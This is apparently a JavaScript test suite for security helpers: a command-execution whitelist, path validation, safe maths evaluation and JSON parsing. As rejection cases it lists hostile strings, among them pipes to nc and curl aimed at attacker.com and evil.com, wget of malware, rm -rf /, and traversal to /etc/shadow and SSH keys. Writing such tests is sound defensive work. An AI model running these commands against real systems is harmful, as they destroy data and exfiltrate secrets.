/**
 * Comprehensive Security Tests
 * Enhanced tests for all security fixes implemented in the Hive Mind remediation
 */

const { expect } = require('chai');
const { execSyncSecure, execSecure, validatePath } = require('../../security/secure-command-executor');
const { safeEvaluateMath, safeParseJSON, safeCompareValue, safeCodeTransformation } = require('../../security/secure-evaluation-utilities');

describe('Comprehensive Security Vulnerability Fixes', () => {

    describe('Mathematical Expression Security', () => {
        it('should safely evaluate basic arithmetic', () => {
            expect(safeEvaluateMath('2 + 3')).to.equal(5);
            expect(safeEvaluateMath('10 * 4')).to.equal(40);
            expect(safeEvaluateMath('15 / 3')).to.equal(5);
            expect(safeEvaluateMath('7 - 2')).to.equal(5);
        });

        it('should handle complex mathematical expressions', () => {
            expect(safeEvaluateMath('(2 + 3) * 4')).to.equal(20);
            expect(safeEvaluateMath('2 ** 3')).to.equal(8);
            expect(safeEvaluateMath('10 % 3')).to.equal(1);
        });

        it('should reject malicious code injection', () => {
            expect(() => safeEvaluateMath('alert("xss")')).to.throw('Invalid mathematical expression');
            expect(() => safeEvaluateMath('process.exit(1)')).to.throw('Invalid mathematical expression');
            expect(() => safeEvaluateMath('require("fs")')).to.throw('Invalid mathematical expression');
            expect(() => safeEvaluateMath('console.log("hack")')).to.throw('Invalid mathematical expression');
        });

        it('should reject function calls and variable access', () => {
            expect(() => safeEvaluateMath('setTimeout(()=>{}, 1000)')).to.throw('Invalid mathematical expression');
            expect(() => safeEvaluateMath('window.location = "evil.com"')).to.throw('Invalid mathematical expression');
            expect(() => safeEvaluateMath('document.body.innerHTML = "hack"')).to.throw('Invalid mathematical expression');
        });

        it('should handle floating point numbers', () => {
            expect(safeEvaluateMath('3.14 * 2')).to.be.closeTo(6.28, 0.01);
            expect(safeEvaluateMath('0.1 + 0.2')).to.be.closeTo(0.3, 0.001);
        });
    });

    describe('Command Execution Security', () => {
        it('should allow whitelisted commands', () => {
            expect(() => execSyncSecure('node --version')).to.not.throw();
            expect(() => execSyncSecure('npm --version')).to.not.throw();
        });

        it('should block command injection via semicolons', () => {
            expect(() => execSyncSecure('node --version; rm -rf /')).to.throw('Dangerous pattern detected');
            expect(() => execSyncSecure('npm list; cat /etc/passwd')).to.throw('Dangerous pattern detected');
        });

        it('should block command injection via pipes', () => {
            expect(() => execSyncSecure('node --version | nc attacker.com 4444')).to.throw('Dangerous pattern detected');
            expect(() => execSyncSecure('npm list | curl evil.com')).to.throw('Dangerous pattern detected');
        });

        it('should block command substitution', () => {
            expect(() => execSyncSecure('node $(cat malicious.txt)')).to.throw('Dangerous pattern detected');
            expect(() => execSyncSecure('npm `echo malicious`')).to.throw('Dangerous pattern detected');
        });

        it('should block unauthorized commands', () => {
            expect(() => execSyncSecure('wget http://evil.com/malware')).to.throw('Command not allowed');
            expect(() => execSyncSecure('curl http://evil.com/steal')).to.throw('Command not allowed');
            expect(() => execSyncSecure('rm -rf /')).to.throw('Command not allowed');
        });

        it('should sanitize command arguments', () => {
            expect(() => execSyncSecure('node script.js --evil="$(rm -rf /)"')).to.throw('Dangerous pattern detected');
        });
    });

    describe('Path Traversal Security', () => {
        it('should allow safe relative paths', () => {
            const result = validatePath('safe/file.txt', '/app');
            expect(result).to.include('/app/safe/file.txt');
        });

        it('should block directory traversal', () => {
            expect(() => validatePath('../../../etc/passwd', '/app')).to.throw('Path traversal attempt detected');
            expect(() => validatePath('../../root/.ssh/id_rsa', '/app')).to.throw('Path traversal attempt detected');
        });

        it('should block absolute path escapes', () => {
            expect(() => validatePath('/etc/shadow', '/app')).to.throw('Path traversal attempt detected');
            expect(() => validatePath('/home/user/.bashrc', '/app')).to.throw('Path traversal attempt detected');
        });

        it('should handle URL-encoded traversal attempts', () => {
            expect(() => validatePath('%2e%2e%2f%2e%2e%2fetc%2fpasswd', '/app')).to.throw('Path traversal attempt detected');
        });

        it('should normalize paths correctly', () => {
            const result = validatePath('./docs/../config.json', '/app');
            expect(result).to.equal('/app/config.json');
        });
    });

    describe('JSON Parsing Security', () => {
        it('should parse valid JSON safely', () => {
            const result = safeParseJSON('{"test": "value", "number": 42}');
            expect(result).to.deep.equal({ test: 'value', number: 42 });
        });

        it('should handle arrays', () => {
            const result = safeParseJSON('[1, 2, 3, "test"]');
            expect(result).to.deep.equal([1, 2, 3, 'test']);
        });

        it('should reject invalid JSON', () => {
            expect(() => safeParseJSON('{invalid json}')).to.throw('JSON parsing failed');
            expect(() => safeParseJSON('function(){}')).to.throw('JSON parsing failed');
        });

        it('should handle nested objects', () => {
            const complex = '{"nested": {"deep": {"value": 123}}}';
            const result = safeParseJSON(complex);
            expect(result.nested.deep.value).to.equal(123);
        });
    });

    describe('Comparison Operations Security', () => {
        it('should safely compare p-values', () => {
            expect(safeCompareValue(0.03, 'p<0.05')).to.be.true;
            expect(safeCompareValue(0.07, 'p<0.05')).to.be.false;
            expect(safeCompareValue(0.05, 'p<=0.05')).to.be.true;
            expect(safeCompareValue(0.06, 'p>0.05')).to.be.true;
        });

        it('should handle different comparison operators', () => {
            expect(safeCompareValue(5, 'x==5')).to.be.true;
            expect(safeCompareValue(5, 'x!=3')).to.be.true;
            expect(safeCompareValue(10, 'x>=10')).to.be.true;
        });

        it('should reject invalid comparison formats', () => {
            expect(() => safeCompareValue(5, 'invalid')).to.throw('Invalid comparison format');
            expect(() => safeCompareValue(5, 'x === eval("malicious")')).to.throw('Invalid comparison format');
        });
    });

    describe('Code Transformation Security', () => {
        it('should safely transform code without execution', () => {
            const code = 'function test() { return 42; }';
            const result = safeCodeTransformation(code);

            expect(result).to.have.property('_transformed', true);
            expect(result).to.have.property('_originalCode', code);
            expect(result).to.have.property('_timestamp');
            expect(result).to.have.property('_hash');
        });

        it('should not execute malicious code during transformation', () => {
            const maliciousCode = 'process.exit(1); console.log("executed");';
            const result = safeCodeTransformation(maliciousCode);

            // Process should still be running
            expect(process.exit).to.exist;
            expect(result._originalCode).to.equal(maliciousCode);
        });

        it('should generate consistent hashes', () => {
            const code = 'const x = 1;';
            const result1 = safeCodeTransformation(code);
            const result2 = safeCodeTransformation(code);

            expect(result1._hash).to.equal(result2._hash);
        });
    });

    describe('Advanced Security Scenarios', () => {
        it('should handle nested injection attempts', () => {
            expect(() => safeEvaluateMath('1 + (eval("process.exit()") || 2)')).to.throw('Invalid mathematical expression');
        });

        it('should protect against prototype pollution in paths', () => {
            expect(() => validatePath('__proto__/constructor/prototype', '/app')).to.throw('Path traversal attempt detected');
        });

        it('should handle Unicode and special characters safely', () => {
            const unicodeExpression = '1 + 2'; // Basic expression with unicode
            expect(safeEvaluateMath(unicodeExpression)).to.equal(3);
        });

        it('should prevent timing attacks through consistent error messages', () => {
            const start1 = Date.now();
            try { safeEvaluateMath('eval("malicious")'); } catch(e) {}
            const time1 = Date.now() - start1;

            const start2 = Date.now();
            try { safeEvaluateMath('process.exit()'); } catch(e) {}
            const time2 = Date.now() - start2;

            // Both should fail quickly and consistently
            expect(time1).to.be.lessThan(100);
            expect(time2).to.be.lessThan(100);
        });

        it('should handle memory exhaustion attempts', () => {
            // Prevent infinite loops or memory bombs
            expect(() => safeEvaluateMath('1'.repeat(10000))).to.throw();
        });

        it('should validate input types strictly', () => {
            expect(() => safeEvaluateMath(null)).to.throw('Expression must be a string');
            expect(() => safeEvaluateMath(undefined)).to.throw('Expression must be a string');
            expect(() => safeEvaluateMath(123)).to.throw('Expression must be a string');
            expect(() => safeEvaluateMath({})).to.throw('Expression must be a string');
        });
    });

    describe('Integration Security Tests', () => {
        it('should work with consciousness explorer patterns', () => {
            // Simulate the consciousness explorer mathematical protocol
            const mathExpression = '2 + 3 * 4';
            const result = safeEvaluateMath(mathExpression);
            expect(result).to.equal(14);
        });

        it('should work with AQE fleet coordination', () => {
            // Simulate safe coordination script execution
            const script = 'npx claude-flow@alpha memory store test "safe value"';

            // This should be allowed through command validation
            const allowedCommands = ['npx claude-flow@alpha memory store', 'npx claude-flow@alpha hooks'];
            const isAllowed = allowedCommands.some(cmd => script.startsWith(cmd));
            expect(isAllowed).to.be.true;
        });

        it('should integrate with statistical framework', () => {
            // Test statistical comparisons
            const pValue = 0.03;
            const isSignificant = safeCompareValue(pValue, 'p<0.05');
            expect(isSignificant).to.be.true;
        });
    });

    describe('Performance and Stress Tests', () => {
        it('should handle large but safe mathematical expressions efficiently', () => {
            const largeExpression = '(' + '1 + '.repeat(100) + '0' + ')'.repeat(100);
            const start = Date.now();

            try {
                safeEvaluateMath(largeExpression);
            } catch (error) {
                // Should fail quickly, not hang
                const elapsed = Date.now() - start;
                expect(elapsed).to.be.lessThan(1000); // Should fail within 1 second
            }
        });

        it('should handle concurrent security validations', async () => {
            const promises = [];

            for (let i = 0; i < 10; i++) {
                promises.push(Promise.resolve().then(() => {
                    return safeEvaluateMath(`${i} + ${i * 2}`);
                }));
            }

            const results = await Promise.all(promises);
            expect(results).to.have.length(10);
            expect(results[0]).to.equal(0);
            expect(results[9]).to.equal(27);
        });
    });
});

describe('Security Configuration and Monitoring', () => {
    it('should enforce timeout limits on command execution', () => {
        // Verify that secure executor respects timeout settings
        expect(() => {
            execSyncSecure('node --version', { timeout: 100 });
        }).to.not.throw();
    });

    it('should limit buffer sizes for command output', () => {
        // Verify that secure executor respects buffer limits
        expect(() => {
            execSyncSecure('node --version', { maxBuffer: 1024 });
        }).to.not.throw();
    });

    it('should log security violations for monitoring', () => {
        // In a real implementation, this would test logging integration
        try {
            execSyncSecure('malicious command; rm -rf /');
        } catch (error) {
            expect(error.message).to.include('Dangerous pattern detected');
        }
    });
});